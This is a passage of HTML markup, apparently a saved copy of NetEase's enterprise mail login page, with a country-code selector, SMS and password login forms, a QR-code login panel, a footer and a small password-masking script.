" href="javascript:;" data-attr="+1787" hidefocus="true">+1787(波多黎各-The Commonwealth of Puerto Rico)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+1809" hidefocus="true">+1809(多米尼加-The Dominican Republic)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+268" hidefocus="true">+268(斯威士兰-The Kingdom of Swaziland)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+382" hidefocus="true">+382(黑山共和国-The Republic of Montenegro)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+1671" hidefocus="true">+1671(关岛-The Territory of Guahan)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+228" hidefocus="true">+228(多哥-Togo)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+690" hidefocus="true">+690(托克劳-Tokelau)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+676" hidefocus="true">+676(汤加-Tonga)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+1868" hidefocus="true">+1868(特立尼达和多巴哥-Trinidad and Tobago)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+216" hidefocus="true">+216(突尼斯-Tunisia)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+90" hidefocus="true">+90(土耳其-Turkey)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+993" hidefocus="true">+993(土库曼斯坦-Turkmenistan)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+1649" hidefocus="true">+1649(特克斯和凯科斯群岛-Turks and Caicos Islands)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+688" hidefocus="true">+688(图瓦卢-Tuvalu)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+971" hidefocus="true">+971(阿拉伯联合酋长国-UAE)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+256" hidefocus="true">+256(乌干达-Uganda)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+380" hidefocus="true">+380(乌克兰-Ukraine)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+44" hidefocus="true">+44(英国-United Kingdom)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+1" hidefocus="true">+1(美国-United States)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+598" hidefocus="true">+598(乌拉圭-Uruguay)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+998" hidefocus="true">+998(乌兹别克斯坦-Uzbekistan)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+678" hidefocus="true">+678(瓦努阿图-Vanuatu)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+39" hidefocus="true">+39(梵蒂冈-Vatican)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+58" hidefocus="true">+58(委内瑞拉-Venezuela)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+84" hidefocus="true">+84(越南-Vietnam)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+1340" hidefocus="true">+1340(美属维京群岛-Virgin Islands U.S.)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+681" hidefocus="true">+681(瓦利斯和富图纳群岛-Wallis et Futuna)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+967" hidefocus="true">+967(也门-Yemen)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+260" hidefocus="true">+260(赞比亚-Zambia)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+263" hidefocus="true">+263(津巴布韦-Zimbabwe)</a></li><li><a class="js-selitem " href="javascript:;" data-attr="+596" hidefocus="true">+596(法属西印度群岛-french west indies)</a></li></ul></div></div></div><input id="phone" class="ipt js-value js-phone u-mobile" tabindex="1" data-lang-placeholder="请输入手机号码" placeholder="请输入手机号码" data-lang-title="请输入手机号码" title="请输入手机号码" name="phone"><div class="m-error"></div></div><div class="m-ipt js-ipt"><input id="code" class="ipt js-value js-vcode" tabindex="2" data-lang-placeholder="请输入验证码" placeholder="请输入验证码" data-lang-title="请输入验证码" title="请输入验证码" name="code"><div id="sendCode" class="sendCode" data-lang-key="发送验证码">发送验证码</div><div id="js_timer" class="sendCode grey" style="display: none;"></div><div class="m-error"></div></div><div id="captcha"><input type="hidden" name="NECaptchaValidate" value="" class="yidun_input"></div><div class="loginbtn"><div class="w-button w-button-account js-mobile-submit" id="mobileSubmit" tabindex="4" data-lang-key="登 录">登 录</div></div><div class="logincheck js-logincheck js-loginPrivate loginPrivate"><span class="icon icon-checkbox js-checkbox"></span> <label for="privateRule" class="checklabel js-autolabel"><input tabindex="3" class="checkipt js-autologin js-privateRule" type="checkbox" id="privateRule"> <span class="u-private-text"><span data-lang-key="我已阅读并同意">我已阅读并同意</span> <a href="https://qiye.163.com/html/service.html" target="_blank" data-lang-key="服务条款">服务条款</a> <span data-lang-key="和">和</span><a href="https://qiye.163.com/html/privacy.html" target="_blank" data-lang-key="隐私政策"> 隐私政策</a></span></label></div><div id="mLoginSslSelector" class="loginact"><div class="loginselect"><a class="selector js-sslsel" href="javascript:;" hidefocus="true"><span data-lang-key="正使用">正使用</span><span class="js-ssltxt" data-lang-key="全程SSL">全程SSL</span><span class="icon icon-arrow"></span></a><div class="m-lgselect js-lgselect"><ul><li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-allssl="1" data-tj-value="1" data-lang-key="全程SSL">全程SSL</a></li><li><a class="js-selitem" href="javascript:;" hidefocus="true" data-allssl="0" data-tj-value="0" data-lang-key="SSL登录">SSL登录</a></li></ul></div></div><div class="chselect"><a class="selector js-chsel" href="javascript:;" hidefocus="true"><span data-lang-key="正在使用">正在使用</span><span class="js-chtxt" data-lang-key="默认线路">默认线路</span><span class="icon icon-arrow"></span></a><div class="m-lgselect js-lgchselect" style="display: none;"><ul><li><a class="js-selitem    selected" href="javascript:;" hidefocus="true" data-ch="" data-tj-value="1" data-lang-key="默认线路">默认线路</a></li><li><a class="js-selitem" href="javascript:;" hidefocus="true" data-ch="hw" data-lang-key="国际线路">国际线路</a></li></ul></div></div></div><input type="hidden" name="survey_token" value="7a3b90e7a2ee1a4eb88f52438ca68423">
</form><div id="msgmid" class="loginerror"></div><div class="js-switch-qrcode"><span class="icon-dashi dashiApp" data-type="1" id="mdashiApp" title="邮箱大师扫码登录2" data-lang-title="邮箱大师扫码登录"></span> <span class="icon-sirius siriusApp" data-type="5" id="siriusApp" title="网易企业邮官方客户端扫码登录" data-lang-title="网易企业邮官方客户端扫码登录"></span> <span class="icon-wx wxApp" data-type="2" id="mwxApp" title="微信扫码登录" data-lang-title="微信扫码登录"></span> <span class="icon-user" data-type="3" id="userApp" title="账号密码登录" data-lang-title="账号密码登录"></span></div></div><form class="login-form login-form-token js-loginform js-loginform-token" action="" name="tokenlogin" method="post" target="_top"><input type="hidden" class="js-token-domain" name="domain" value=""> <input type="hidden" class="js-token-account" name="account_name" value=""> <input type="hidden" class="js-token" name="token" value=""> <input type="hidden" class="js-isAllSecure" name="all_secure" value="1"> <input type="hidden" class="js-isSecure" name="secure" value="1"> <input type="hidden" class="js-ch" name="ch" value=""><input type="hidden" name="survey_token" value="7a3b90e7a2ee1a4eb88f52438ca68423">
</form><div style="display: none;" id="accountList"><div class="m-loginbox-back" id="accountBack"><span class="u-prev-step"></span><span data-lang-key="返回">返回</span></div><div class="m-loginbox-title" data-lang-key="请选择要登录的账号">请选择要登录的账号</div><ul class="login-account-list" id="mobileChoose"></ul></div><div style="display: none;" id="mobileVerify"><div class="m-loginbox-back" id="verifyBack"><span class="u-prev-step"></span><span data-lang-key="返回">返回</span></div><div class="m-loginbox-title" data-lang-key="首次登录请完成账号验证">首次登录请完成账号验证</div><div class="m-loginbox-input"><div class="m-ipt js-ipt disable"><input class="ipt js-account-value" id="js-account-value" tabindex="1" disabled="disabled"><div class="m-error"></div></div><div class="m-ipt js-ipt"><input class="ipt js-pwd-value" id="js-pwd-value" tabindex="2" data-lang-placeholder="密码" placeholder="密码" data-lang-title="请输入密码" title="请输入密码" type="text" name="password"><div class="m-error"></div></div><div class="loginbtn" id="verifyPwd"><button class="w-button w-button-account" tabindex="4" data-lang-key="验证并登录">验证并登录</button></div><div id="pwdmid" class="loginerror pwderror"></div></div></div></div><div class="m-codebox js-codebox f-zindex-10"><div id="appLoginTab" class="appLoginTab"><h3><span data-lang-key="请使用">请使用</span><span id="appLoginText">网易邮箱大师</span><span data-lang-key="扫描二维码登录">扫描二维码登录</span></h3><div id="appLoginWait" style="display: block;"><div id="appCodeWrap" class="appCodeWrap allowmove"><div class="appCode-example"></div><div id="appCodeBox" class="appCodeBox"><div id="dashiAppCode" class="appCode" style="width: 180px; height: 180px; display: block;" title="https://mail.qiye.163.com/static/login/dashi/dashiScanLogin.html?code=9e8c2c709d1f4a519a507f8acf83cd41&amp;hl=undefined"><canvas width="180" height="180" style="display: none;"></canvas><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0CAYAAAA9zQYyAAANm0lEQVR4AeydgY70Ng6Dl33/d+7VQIuNvslvjs6zM3GWxRkNQ4mSaSFnLOZwf319ff39rvX34j+uTyfPfBe/ynfrdePZH/MddvnkianveMb/BB4D/Y9u/hMH7uFABvoe55hd/OtAGeh//ivj65Xr3xpP/0vSl/S9mMjeyBNL31qSHvYmVd7lO16qeuxXqrxUcTee/TDfYeY7LM37dfmuny5/Vq8M9FlA3sWBnRzIQO90Wku9/o7kDPTvOOdfs8vpQEv1ziTNcdc1qep183nnkqoe+a4+46WqT75b79Xx0rw/qfJSxdzPT2Op1pfm+Jl+pgP9jEBi4sCVHMhAX+k00suyAxnoZQsjcCUHLj3QUr1TdY2Tnst/VtfdeaVaT6rY1ZFqvKvn9By/qi/Vfl29d/CXHuh3GJAa93IgA32v8/z1u8lA//oRuJcBlxpod6eTenc26kk1f5VfHQWp9rOqx3ypp+/8oP4V8aUG+ooGpae9HDADvddm0m0cyEBnBm7lwHSgeady+NXOsB71pfkdUao89aQ1nv1Q32GXL9X+pDnu1pOqnuunq089YqdHnvlneDrQZwl5Fweu7EAG+sqnk97aDmSg25bdNOEm2yoDLdU7lbSGVz2San13p3L8aj/dfKn2381nfHd/Uq2/ms9+pKpPnliq8dIapv7AZaDHi6w4sLMDGeidTy+9PziQgX6wJC92duAv3qt+EneNYi8uX6p3stV8V8/xq/W7+a6fVV6q/jo99v8OnC+0O5Wvr0Rs5EAGeqPDSqvegQy09ygRGznwl/R9L2Lf0jcnrT9Tn3cq8tK8JvOJqefwar4071eqPPthfanGSxW7+C7v+unyUu1XWsOsf4bzhT5zJe+2dSADve3RpfEzB9YG+kwx7+LABx2YDjTvYOyzy0u9OxT1idmPVPXJOyzN86XKu37IE7t+GE/MfPLSvF+p8tQjdvounvkunrxU+5Ue8XSgKRgcB67uQAb66ieU/loOZKBbdiX46g6U33JIj3cS6fsdNyN9c5JIl/+/FOmRZ4K7YzGemPmSSg8unvkuvstLtR/WkyovzTHrSzWe+ownL9V86RtLj8/Ukx5jpD+/c/XJsx75gfOFpkvBWzuQgd76+NI8HchA05HgrR0ov+UYd5DZ4k5nsWcc84mlP9+3JDH8AUsqd2b28JCAF1LNB120pRorPWLmu37IE1NPqjVXedYjpn6XZ7xU++/y7GfgfKGHC1m3cSADvXyUEbiSAxnoK51Gell2oAy0VO80UsWumlTjpYp5R6IeeWLGS3N9qfLSHFOf2PVDXurVk+bx1Cdmvw4zX6r1mc948sRS1ZMqdnqOl6qepK8y0F/5Jw5s7kAGevMDTPvVgQx09SNocwfKbzncXninkeodhjyxNI+XKi/Ncbdf9tPNl2o/zJcq361HPeZLVV+qmPnE0jye9Vy+tKbn9Mk/g/OFfsalxGzjQAZ6m6NKo884kIF+xqXEbONAGWh3h+KuXLxU71iMl+Y841mfWKp65H8au37JS7XfLs/4LpZqfWmO6Z+rJ1U95ks9XqrxZ/XLQLNgcBx40oHLhGWgL3MUaeQVDmSgX+FiNC7jQPk9tDS/o0iVlyrmrnjHIU8svVaP+sTsj7gbL837l3q860ea67F/qRfPfIeln9V3foz+8oUeLmTdxoEM9G2OMhsZDmSghws/uaL9VgeWBtrdaaT5ncrlOyeYT+zyyUu1X2mOmb9an/nSvH433vVLPYep57DTczz1pUd/lgaaBYLjwKcdyEB/+gRS/6UOZKBfamfEPu3A9PfQUr2juGalGs87kVR5qWIX7+qTl6o+eWLWJ2a8w1Kt39Xrxrt+qCfV/ly+VOOlipnPeuSleb4056k38Ce/0KN+Vhx4qQMZ6JfaGbFPO5CB/vQJpP5LHWgNNO9E0vyOI8351Z1IVV+q2PUr1Xhpjp0e99ONl3r1WY/41fWdvqsn1f25eNaT5vlDrzXQLBAcB67mQAb6aidyy37et6kM9Pu8TqU3OFAGetxBZkvyd5hZPvfDWKnqM56Y+eSJGU/s4qXaH/Olyjs95jOeWKr6UsUunrzD3f6o5/Klef9dvRFfBnq8yIoDOzuQgd759NL7gwMZ6AdL8mJnB8r/ppAbkeZ3HKny0hw7/e6dS6r1mC9VXqqY/RBL83ipx0s1XtLXcbF/9kPe4VfnU+/Y+zPPzCd2+2EN5g+cL/RwIes2DmSgb3OU2chwIAM9XMi6jQPl99C8o7g7DV1w8eSZz/rkV7GrT95h9uPiyTOf+2c8eZdP3mGn7/LZr8PUY31i6pEfOF9ouhq8tQMXHuitfU3zH3IgA/0h41P2ZxxY+ju0a2ncaY7LxZPnnanLM/7YyzPPzO9i1nD53K/LJ898YsYTsz/y1GM8MfPJEzt96jF+4Hyh6Wrw1g5koLc+vjRPBzLQdCT4/Q68sGL5O/S4gxwX6/AOQ574qDWeyXfx0Dgu9kN8jB3Prt6IOS7GU5888VFrPJN3eOTMFvPZHzHjHWZtF0++m7/a76ifL/RwIes2DmSgb3OU2chwIAM9XMi6jQPTgeYdiJgu8A7kMPO7+i6f9VfjmU/Meg6v5ju/yHcx+3PY7Ze803P9Um/g6UC7guF/3IEUaDqQgW4alvBrO5CBvvb5pLumAy/9LYe78zi+2bsN79Zj/LiTHZct2AxgPYcpf+xtPDN/vOss6jvMet34br7TH3y+0MOFrNs4kIG+zVFmI8OBfQd6dJ8VB+BA+S0H71uI/SLPOxD5V2PWY3/Erj7jHXb1V3nWZ/9O38Uzn5j5xOzPYeozvqvPeOoPnC80XQ7e2oEM9NbHl+bpQAaajgRv7cD079DdnY07zGxRbxZ7xrl8x1OT8Q67O1w3n3rMZ78unvkOOz1Xn/ku3vVD/j/9//7t+BGXLzRdCt7agQz01seX5ulABpqOBG/tQPk7tNsJ70iMH3eY2WI8MXPJO9zN78Zz/y6f8eyfPPWIGe8w63X1mN+tx3yHnf4zfL7QzuXwWzmQgd7quNhsMB3IQNOR4K0dKAPNOwp3xjsYMfMdpj7jya9i9ks9xzOe/TKf2MU7ffLErEfM+sx/N2Y/7Jf9kD/DZaApEBwHdnMgA73biaXfqQMZ6Kk9IXdzoPyWg3cS3nEcZr7DNIvxjmf8sb/xzPzx7ri6PONZn3wXH3sbz139kTNb7Mfpr/Lsxem5ePJnOF9onnLw1g5koLc+vjRPBzLQdCR4awemv+Vwdx7u/OxOc3zHeOJj7Hgmv4q5n1HjuBzP+sfcZ56ZT+zqkyem3irmnrr1uvHdfqk/cL7QXRcTfzUHSj8Z6GJHwO4OZKB3P8H0Xxwof4fmnYm4ZD4Bxp3muJzeMXY8uxLv1mM/o8fjIt/Fbj/kiY+9nD2zH+aTJ+7Gu/yzHo/vWO/IjWfyA+cLTdeDt3YgA7318aV5OpCBpiN3wr9wL62/Q497S2eNO81x0V9qHWPHM3mXT35ozBb1u5ja3Xz2y3zyP41dffJu/13exXP/7GfgfKHpUvDWDmSgtz6+NE8HMtB0JHhrB6YDzTsNMXdOftxpZovx1Oti1nL5rE/MfPKsR575xIwnpr7DzCfu5jOe/Tue8cTMJ2b/zCc/8HSgKXAjnK3c1IEM9E0P9rduKwP9W0/+pvsuA807jMPOk3GnOS4X3+WP2uO5m78aP2oeF/2i/jF2PDOeeMQcF/UcXtU71h7Prt6IOS5X/xg7nqnv8hk/cBno8SIrDuzsQAZ659NL7w8OPA70Q0hexIF9HPjo76F5RyIe96rjoq0unrzD1D/WHs/kqUeeuBvP/NHDbDl98tQiT8x49sd4xzOe+sTP6OULTZeCt3YgA7318aV5OpCBpiPBWzsw/T00d8Y7DbGLJ0/s9Fw872QunrzLZzwx+3eY+V3c7Zf9sB55YleP8Q6zPvWJGX+G84U+cyXvtnUgA73t0aXxMwcy0Geu5N22DpS/Q/PO8mpMl3jHcvWYT0w9YsZ3Mftz+d149st8YsazH8dTz2HqO0w9F9/tl/ED5wvtXA6/lQMZ6NPjystdHchA73py6fvUgTLQ4w7yynVa8fCye8c6pJ4+Us9ht9fTIo2X1Hep7Lcbz3pdPVevy7Mfl+/6fUavDLQrGD4OXN2BDPTVTyj9tRzIQLfsSvDVHZgONO80A8/W6mZ5R3KY9RhPvou5V6fPeIfZj9NfjWc/rOcw6xNT32HmE7Mf6jF+4OlAj4CsOLCTAxnonU4rvVoHMtDWogTs5MBWA+3uUOR5ByNmvDs4F099p0ee+tQjZr7Dr853eo53/Tqefg281UC7DYZ/qQNbimWgtzy2NP0nBzLQf3Im77d0YOuBHnem4+qegLvjdfljL+OZ+cTsl/zQOC7GEx9jxzP1XPzIWVmuHnmH2Qv7P8vfeqC5weA4kIHODNzKgQz0/3OcybmsA9OBPrujzN51d0kt5rs7FOOp5/IdT31i5nfrM5765FmPmPmOZzwx6zu+W4/xxK4e+YGnAz0CsuLATg5koHc6rfRqHchAW4sSsJMDZaB5h1nFzgin/9N3OOqzH9c/81089R2mHus5zHzWc/kuvsuzH+JuP8wfuAz0eLG4kh4HPupABvqj9qf4qx3IQL/a0eh91IEM9EftT/FXO/A/AAAA//+oP7foAAAABklEQVQDACZEXEgqoWVqAAAAAElFTkSuQmCC" style="display: block;"></div><img id="appCode" class="appCode" width="180" height="180" src="https://mg.127.net/static/login/" data-retry-id="9wvi6stnr56" style="display: none;"><div id="appCodeRefresh" class="appCodeRefresh" style="display: none;"><div class="appCode-mask"></div><div class="appCode-wrap"><p data-lang-key="二维码已失效">二维码已失效</p><a href="javascript:;" data-tj-key="b_appLogin_refresh_qrcode_click" data-lang-key="请点击刷新">请点击刷新</a></div></div></div></div><p id="appLoginTxtNormal" class="appLoginTxt appLoginTxtNormal txt-err" style="display: none;"><span data-lang-key="扫码并关注网易企业邮箱服务号">扫码并关注网易企业邮箱服务号</span><a href="#" target="_blank"></a></p><p id="appLoginTxt" class="appLoginTxt txt-err" data-lang-key="请您在手机端完成邮箱账号绑定" style="display: none;">请您在手机端完成邮箱账号绑定<a href="#" target="_blank"></a></p></div><div id="appLoginScan" class="appLoginScan" style="display:none"><div class="appLogin-scanSuc"></div><p class="appLogin-scantxt txt-suc" data-lang-key="成功扫描，请在手机上确认登录">成功扫描，请在手机上确认登录</p><a id="appLoginRestart" class="appLoginRestart" href="javascript:void(0)" data-lang-key="返回重新扫描">返回重新扫描</a></div></div><div id="qrcodeLoginSslSelector" class="loginact"><input type="hidden" id="appCh" value=""><div class="loginselect"><a class="selector js-sslsel" href="javascript:;" hidefocus="true"><span data-lang-key="正使用">正使用</span><span class="js-ssltxt" data-lang-key="全程SSL">全程SSL</span><span class="icon icon-arrow"></span></a><div class="m-lgselect js-lgselect"><ul><li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-allssl="1" data-lang-key="全程SSL">全程SSL</a></li><li><a class="js-selitem" href="javascript:;" hidefocus="true" data-allssl="0" data-lang-key="SSL登录">SSL登录</a></li></ul></div></div><div class="chselect"><a class="selector js-chsel" href="javascript:;" hidefocus="true"><span data-lang-key="正在使用">正在使用</span><span class="js-chtxt" data-lang-key="默认线路">默认线路</span><span class="icon icon-arrow"></span></a><div class="m-lgselect js-lgchselect" style="display: none;"><ul><li><a class="js-selitem    selected" href="javascript:;" hidefocus="true" data-ch="" data-lang-key="默认线路">默认线路</a></li><li><a class="js-selitem" href="javascript:;" hidefocus="true" data-ch="hw" data-lang-key="国际线路">国际线路</a></li></ul></div></div></div><div class="pane-handler"><a href="javascript:;" id="switchNormalCtrl" data-tj-key="b_AccountPWD_text_click" data-lang-key="密码登录">密码登录</a></div></div><div id="normalLoginFormMask" class="login-form-mask" style="display: none;"><p class="login-form-mask-loading"><i></i><span data-lang-key="载入中...">载入中...</span></p></div><div id="loginPanelBottomAdBlock" class="m-login-bottom-ad"><span class="m-login-bottom-ad-icon"></span> <span class="m-login-bottom-ad-name">网易邮箱官方客户端</span> <span class="m-login-bottom-ad-btn">立即下载</span></div></div></div></section><footer class="g-ft"><div class="g-wrap"><nav class="m-ftnav"><a href="javascript:;" data-lang-key="已支持IPv6网络">已支持IPv6网络</a> <a href="#" target="_blank" data-tj-key="b_AboutNetease_click" data-lang-key="关于网易">关于网易</a> <a href="#" target="_blank" data-tj-key="b_Weibo_click" data-lang-key="官方微博">官方微博</a><a href="#" target="_blank" data-tj-key="b_AboutLegal_click" data-lang-key="相关法律">相关法律</a><a href="#" target="_blank" data-tj-key="b_PrivacyPolicy_click" data-lang-key="隐私政策">隐私政策</a>&emsp;|&emsp;<span data-lang-key="网易公司版权所有">网易公司版权所有</span>©1997-2026<a id="KX_IMG" class="w-kximg" href="#" target="_blank"><div class="knet-img"></div></a></nav></div></footer><div class="m-dialog" id="dialog"><div class="m-dialog-bg"></div><div class="u-dialog"><div class="u-dialog-hd"><div class="u-dialog-title"><span data-title-key="提示" id="tipDialog"></span><div class="u-dialog-close J_closeDialog" id="closeDialog">X</div></div></div><div class="u-dialog-bd" id="dialogContent"></div><div class="u-dialog-ft"><div class="u-dialog-btn J_closeDialog" id="cancleDialog"></div><div class="u-dialog-btn confirm" id="confirmDialog"></div></div></div></div>
            <img src="https://ssl.mail.163.com/httpsEnable.gif" style="position: absolute;left: -999em;top: -999em;width: 0;height: 0;">
            
<script type="text/javascript">
document.addEventListener('DOMContentLoaded', function () {
    var ids = ['accpwd', 'adminpwd', 'js-pwd-value'];
    for (var i = 0; i < ids.length; i++) {
        var el = document.getElementById(ids[i]);
        if (el && el.tagName === 'INPUT' && typeof MaskedPassword !== 'undefined') {
            new MaskedPassword(el, '\u25CF');
        }
    }
});
</script>
</body>
</html>